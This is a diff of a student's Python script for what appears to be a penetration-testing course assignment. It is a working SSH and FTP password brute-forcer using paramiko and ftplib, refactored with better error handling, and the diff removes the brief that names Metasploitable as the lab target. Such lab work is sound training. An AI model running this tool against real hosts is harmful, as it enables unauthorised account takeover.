@@ -4,57 +4,6 @@ COM5413 — The Benji Protocol
 Task 3: The Access Validator
 File:   brute.py
 ================================================================================
-
-MISSION BRIEF
--------------
-Some doors are locked. Some are locked with the factory default. A good
-operative checks quietly, one at a time, without tripping the alarm. Benji
-does not kick doors down — he tries the handle first, then tries the spare key,
-then the one labelled "admin123" that someone left on a sticky note.
-
-Your job is to build a targeted credential testing tool for SSH and FTP
-services. This is a precision instrument, not a battering ram — the mandatory
-delay between attempts is not optional, and it is not a courtesy. It is what
-separates a professional test from a denial-of-service attack.
-
-WHAT THIS SCRIPT MUST DO
--------------------------
-1. Accept target IP, service (ssh/ftp), username, and wordlist path as
-   command-line arguments.
-2. For FTP: use ftplib to attempt authentication.
-3. For SSH: use paramiko to attempt authentication.
-4. Iterate through the wordlist, attempting each password in sequence.
-5. Include time.sleep(0.1) between each attempt — this is a hard requirement.
-6. Stop immediately upon finding valid credentials.
-7. Log each attempt (timestamp, username, password tried, result) to a file.
-
-CONSTRAINTS
------------
-- Python 3.10+ only.
-- SSH: must use paramiko. FTP: must use ftplib.
-- time.sleep(0.1) MUST be present between attempts — auto-grader checks this.
-- NO use of input() — all input via argparse.
-- Wordlist may contain empty lines and non-ASCII characters — handle both.
-
-OUTPUT CONTRACT (auto-grader depends on this)
----------------------------------------------
-On success, print exactly:
-    [+] SUCCESS: Password found: <password>
-
-On exhaustion (no valid credentials found), print exactly:
-    [-] EXHAUSTED: No valid credentials found for user <username>
-
-EXAMPLE USAGE
--------------
-    python brute.py 192.168.56.101 --service ftp --user msfadmin --wordlist rockyou_small.txt
-    python brute.py 192.168.56.101 --service ssh --user root --wordlist common_passwords.txt
-
-BUILD LOG
----------
-Use docs/build.md to document your testing approach. Record what you observe
-when testing against Metasploitable — attempt counts, timing, any connection
-drops. This becomes part of your evidence trail.
-================================================================================
 """
 
 import argparse
@@ -66,6 +15,8 @@ import time
 from datetime import datetime, timezone
 from pathlib import Path
 
+# Try importing paramiko (required for SSH)
+# If not installed, fail cleanly instead of crashing
 try:
     import paramiko
 except ImportError:
@@ -73,85 +24,102 @@ except ImportError:
     sys.exit(1)
 
 
-def valid_port(value: str):
+# Custom error to separate network/service issues from wrong passwords
+class ServiceUnavailableError(Exception):
+    """Raised when the target service cannot be reached."""
+
+    pass
+
+
+# Validate port input early (before script runs fully)
+def valid_port(value: str) -> int:
+    """
+    Ensure port is within valid range (1–65535).
+    """
     try:
-        """ "Make sure the port range is a valid range 1-65535"""
         port = int(value)
     except ValueError as error:
-        raise argparse.ArgumentTypeError("Port must be a number") from error
+        raise argparse.ArgumentTypeError("Port must be a number.") from error
+
     if not 1 <= port <= 65535:
-        raise argparse.ArgumentTypeError("port range must be within 1-65535")
+        raise argparse.ArgumentTypeError("Port must be between 1 and 65535.")
+
     return port
 
 
 def parse_arguments():
     """
-    Define and parse command-line arguments.
-
-    Returns the parsed namespace object.
-    Required: target (positional), --service, --user, --wordlist
+    Parse CLI arguments using argparse (no input()).
     """
     parser = argparse.ArgumentParser(
         description="Targeted credential testing tool for FTP and SSH."
     )
+
     parser.add_argument("target", help="Target IP address or hostname")
+
     parser.add_argument(
         "--service",
         choices=["ftp", "ssh"],
         required=True,
         help="Service to test: ftp or ssh",
     )
+
     parser.add_argument("--user", required=True, help="Username to test")
+
     parser.add_argument(
-        "--wordlist", type=Path, required=True, help="Path to the password wordlist"
+        "--wordlist",
+        type=Path,
+        required=True,
+        help="Path to password wordlist",
     )
+
+    # Use our validator here instead of plain int
     parser.add_argument(
         "--port",
         type=valid_port,
         default=None,
-        help="Optional port override (default: 21 for FTP, 22 for SSH)",
+        help="Optional port override (default: 21 FTP / 22 SSH)",
     )
+
+    # Default log file (pytest will use this automatically)
     parser.add_argument(
         "--output",
         type=Path,
         default=Path("attempt_log.csv"),
-        help="Path to CSV log file",
+        help="CSV log output path",
     )
+
     return parser.parse_args()
 
 
 def load_wordlist(wordlist_path: Path) -> list[str]:
     """
-    Load passwords from a wordlist file.
-
-    Args:
-        wordlist_path: Path to the wordlist file.
-
-    Returns:
-        List of password strings with empty lines and whitespace stripped.
-
-    Raises:
-        FileNotFoundError: If wordlist does not exist.
+    Load and clean passwords from file.
+    Removes empty lines and handles messy/non-ASCII input.
     """
     if not wordlist_path.exists():
         raise FileNotFoundError(f"Wordlist not found: {wordlist_path}")
 
+    # errors="ignore" prevents crashes on weird characters
     with wordlist_path.open("r", encoding="utf-8", errors="ignore") as file:
         return [line.strip() for line in file if line.strip()]
 
 
 def log_attempt(output_path: Path, user: str, password: str, result: str) -> None:
     """
-    Append a single credential attempt to a CSV log file.
+    Log each attempt to CSV (evidence trail).
+    Creates file if it doesn't exist.
     """
     write_header = not output_path.exists() or output_path.stat().st_size == 0
 
     try:
-
         with output_path.open("a", encoding="utf-8", newline="") as file:
             writer = csv.writer(file)
+
+            # Write header only once
             if write_header:
                 writer.writerow(["timestamp", "username", "password", "result"])
+
             writer.writerow(
                 [
                     datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
@@ -160,32 +128,37 @@ def log_attempt(output_path: Path, user: str, password: str, result: str) -> Non
                     result,
                 ]
             )
+
     except OSError as error:
-        print(f"[-] could not write to log file, {error}", file=sys.stderr)
+        print(f"[-] ERROR: Could not write to log file: {error}", file=sys.stderr)
         sys.exit(1)
 
 
 def attempt_ftp(target: str, port: int, user: str, password: str) -> bool:
     """
-    Attempt FTP authentication using ftplib.
-
-    Args:
-        target:   IP address string.
-        port:     Port number integer.
-        user:     Username string.
-        password: Password string to test.
-
-    Returns:
-        True if authentication succeeds, False otherwise.
+    Try FTP login.
+    True = success
+    False = wrong credentials
+    Raises error if service unreachable
     """
     ftp = ftplib.FTP()
+
     try:
         ftp.connect(host=target, port=port, timeout=5)
         ftp.login(user=user, passwd=password)
         ftp.quit()
         return True
-    except (ftplib.error_perm, ConnectionRefusedError, TimeoutError, OSError):
+
+    # Wrong username/password
+    except ftplib.error_perm:
         return False
+
+    # Real network issue (server down, port closed, timeout)
+    except (ConnectionRefusedError, TimeoutError, OSError) as error:
+        raise ServiceUnavailableError(
+            f"FTP service unavailable on {target}:{port}"
+        ) from error
+
     finally:
         try:
             ftp.close()
@@ -195,16 +168,10 @@ def attempt_ftp(target: str, port: int, user: str, password: str) -> bool:
 
 def attempt_ssh(target: str, port: int, user: str, password: str) -> bool:
     """
-    Attempt SSH authentication using paramiko.
-
-    Args:
-        target:   IP address string.
-        port:     Port number integer.
-        user:     Username string.
-        password: Password string to test.
-
-    Returns:
-        True if authentication succeeds, False otherwise.
+    Try SSH login.
+    True = success
+    False = wrong credentials
+    Raises error if service unreachable
     """
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
@@ -222,50 +189,86 @@ def attempt_ssh(target: str, port: int, user: str, password: str) -> bool:
             auth_timeout=5,
         )
         return True
-    except (
-        paramiko.AuthenticationException,
-        paramiko.SSHException,
-        socket.error,
-        OSError,
-    ):
+
+    # Wrong credentials
+    except paramiko.AuthenticationException:
         return False
+
+    # SSH server/network issues
+    except (paramiko.SSHException, socket.error, OSError) as error:
+        raise ServiceUnavailableError(
+            f"SSH service unavailable on {target}:{port}"
+        ) from error
+
     finally:
         client.close()
 
 
 def main():
-    args = parse_arguments()
-
-    port = args.port if args.port is not None else (21 if args.service == "ftp" else 22)
-
     try:
-        passwords = load_wordlist(args.wordlist)
-    except FileNotFoundError as error:
-        print(f"[-] ERROR: {error}", file=sys.stderr)
-        sys.exit(1)
+        args = parse_arguments()
 
-    if not passwords:
-        print("[-] ERROR: Wordlist is empty after cleaning.", file=sys.stderr)
-        sys.exit(1)
-
-    attempt_function = attempt_ftp if args.service == "ftp" else attempt_ssh
-
-    for password in passwords:
-        success = attempt_function(args.target, port, args.user, password)
-        log_attempt(
-            args.output,
-            args.user,
-            password,
-            "SUCCESS" if success else "FAIL",
+        # Decide default port based on service
+        port = (
+            args.port
+            if args.port is not None
+            else (21 if args.service == "ftp" else 22)
         )
 
-        if success:
-            print(f"[+] SUCCESS: Password found: {password}")
-            return
+        # Load passwords
+        try:
+            passwords = load_wordlist(args.wordlist)
+        except FileNotFoundError as error:
+            print(f"[-] ERROR: {error}", file=sys.stderr)
+            sys.exit(1)
 
-        time.sleep(0.1)
+        # Handle empty file after cleaning
+        if not passwords:
+            print("[-] ERROR: Wordlist is empty after cleaning.", file=sys.stderr)
+            sys.exit(1)
 
-    print(f"[-] EXHAUSTED: No valid credentials found for user {args.user}")
+        # Choose correct function dynamically
+        attempt_function = attempt_ftp if args.service == "ftp" else attempt_ssh
+
+        # Main brute loop
+        for password in passwords:
+
+            try:
+                success = attempt_function(
+                    args.target,
+                    port,
+                    args.user,
+                    password,
+                )
+
+            except ServiceUnavailableError as error:
+                # Stop immediately if service is down
+                print(f"[-] ERROR: {error}", file=sys.stderr)
+                sys.exit(1)
+
+            # Log every attempt
+            log_attempt(
+                args.output,
+                args.user,
+                password,
+                "SUCCESS" if success else "FAIL",
+            )
+
+            # Stop immediately on success (important requirement)
+            if success:
+                print(f"[+] SUCCESS: Password found: {password}")
+                return
+
+            # Mandatory delay (prevents aggressive behaviour)
+            time.sleep(0.1)
+
+        # If loop finishes with no success
+        print(f"[-] EXHAUSTED: No valid credentials found for user {args.user}")
+
+    except KeyboardInterrupt:
+        # Clean exit if user presses Ctrl+C
+        print("\n[-] INTERRUPTED: Execution stopped by user.", file=sys.stderr)
+        sys.exit(1)
 
 
 if __name__ == "__main__":
